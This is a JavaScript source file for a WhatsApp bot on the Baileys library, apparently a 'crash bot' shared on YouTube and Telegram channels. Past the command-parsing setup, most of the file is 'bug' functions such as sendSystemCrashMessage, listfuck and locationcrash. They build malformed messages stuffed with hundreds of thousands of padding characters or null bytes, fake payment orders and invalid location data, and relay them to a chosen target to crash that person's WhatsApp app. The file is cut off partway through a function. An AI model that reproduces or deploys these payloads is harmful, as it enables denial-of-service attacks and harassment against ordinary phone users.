/*

       Subscribe My YouTube Channel: @GlobalTechInfo

Follow The Channel For More :https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07

Contact Me: https://t.me/GlobalTechInc

GitHub: https://github.com/GlobalTechInfo

Credit Qasim Ali

🚫 DON'T TRY TO CHANGE ANYTHING OTHERWISE BOT WILL NOT WORK PROPERLY 🚫

*/
require("./config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')

module.exports = async (GlobalTechInc, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, DATE, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (GlobalTechInc.user.id.split(':')[0]+'@s.whatsapp.net' || GlobalTechInc.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await GlobalTechInc.decodeJid(GlobalTechInc.user.id)
const senderNumber = sender.split('@')[0]
const orgkaya = JSON.parse(fs.readFileSync('./database/owner.json'))
const kontributor = JSON.parse(fs.readFileSync('./database/owner.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isPremium = [botNumber, ...premium, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await GlobalTechInc.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
//====================================\\
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
// There's no need to do anything if you don't want errors
try {
ppuser = await GlobalTechInc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

// respon list 
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
GlobalTechInc.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
GlobalTechInc.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
const virgam = fs.readFileSync(`./lib/image/virgam.png`)
const slayer = fs.readFileSync(`./lib/image/slayer.png`)
const latx = fs.readFileSync(`./lib/image/latx.png`)
const anjay = fs.readFileSync(`./GlobalTechNew/anjay.jpg`)
const qris = fs.readFileSync(`./GlobalTechNew/qris.jpg`)
const { button } = require("./lib/ngentot.js")
const { ios } = require("./lib/ios.js")
const { andro } = require("./lib/andro.js")
const dokupalsu = fs.readFileSync(`./lib/image/GlobalTech.apk`)
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};
// 𝘙𝘌𝘗𝘓𝘠
async function loading () {
var genalpa = [
"𝘟",
"𝘊𝘳𝘢𝘴𝘩",
"𝘎𝘭𝘰𝘣𝘢𝘭 𝘟 𝘊𝘳𝘢𝘴𝘩"
]
let { key } = await GlobalTechInc.sendMessage(m.chat, {text: '𝘡𝘺𝘯𝘹𝘻𝘰𝘰'})

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

for (let i = 0; i < genalpa.length; i++) {
await sleep(10)
await GlobalTechInc.sendMessage(m.chat, {text: genalpa[i], edit: key });
}
}

// FUNCTION BUG //
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return 
    GlobalTechInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return GlobalTechInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
    
const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🪨Msg ${m.body || m.mtype}`,
jpegThumbnail: dokupalsu,
}
}
}

const oneclick = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰`
}
}
}

const zynbug = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `GlobalTechInc 💸`
}
}
}

async function listfuck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰"+" ".repeat(920000),
        'footerText': `ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰`,
        'description': `ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclick });
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

const GlobalTechbug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/virgam.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Zʏɴxᴢᴏᴏ\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
}
]
}
}
}
}

async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    GlobalTechInc.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function sendExtendedTextMessage(jid) {
  GlobalTechInc.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  GlobalTechInc.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}
async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "CRASH WHATSAPP"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'GlobalTech', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await GlobalTechInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": anjay
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"GlobalTechInc Crash",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const zpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `Msg ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

async function aipong(target) {
await GlobalTechInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",,\"name\":\"✳️᜴࿆͆᷍MODS CRASH╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`

}

]

}

}

}

}


async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `GlobalTechInc DOCUMENT`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function ListMSGVIP3(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: '𝖅𝖞𝖓𝖝𝖟𝖔𝖔',
                        },
                        body: {
                            text: '𝖃',
                        },
                        footer: {
                            text: '𝕮𝖗𝖆𝖘𝖍',
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : '𝖅𝖞𝖓𝖝𝖟𝖔', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝖃', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝕮𝖗𝖆𝖘𝖍', url : , merchant_url :  }",
                                },
                            ],
                            messageParamsJson: ''.repeat(999999),
                        },
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await GlobalTechInc.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function ListMSGVIP4(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title:
              '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' + '\0'.repeat(920000),
                footerText: '',
                description: '',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'Hemm',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'ppq',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: false,
            },
        }),
        { userJid: userJid }
    );
    await GlobalTechInc.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function locationcrash(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function bugzynz(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {

  "liveLocationMessage": {
